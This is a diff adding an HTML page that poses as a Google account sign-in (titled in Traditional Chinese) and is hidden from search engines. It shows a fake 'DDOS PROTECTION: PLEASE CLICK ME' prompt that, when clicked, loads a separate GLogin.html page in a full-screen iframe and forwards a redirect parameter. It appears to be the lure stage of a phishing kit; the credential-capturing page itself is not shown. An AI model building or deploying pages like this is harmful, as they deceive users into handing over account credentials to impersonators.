@@ -1,0 +1,35 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>登入您的 Google 帳戶</title>
+<meta name="description" content="登入 Google 帳戶以使用此服務">
+<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
+<meta name="robots" content="noindex, nofollow">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+	<h1 style="top: 50px; cursor: pointer" id="ddos" onClick="tddos()">DDOS PROTECTION: PLEASE CLICK ME</h1>
+<iframe width="100%" height="100%" src="" style="border:none; display: none" scrolling="no" id="frame"></iframe>
+<script>
+	function tddos() {
+		document.getElementById("frame").src = "./content/GLogin.html?redirect="+urldata("redirect");
+		document.getElementById("frame").style.display = "";
+		document.getElementById("ddos").style.display = "none";
+	}
+	function urldata(key) {
+		var u = location.href;
+		var n = key.length;
+		var i = u.search(key)+n+1;
+		var a = "";
+		while(u.charAt(i)!=""&&u.charAt(i)!="&") {
+			a += u.charAt(i);
+			++i;
+		}
+		return a;
+	}
+	function goto(url) {
+		window.location.href=url;
+	}
+</script>
+</body>
+</html>
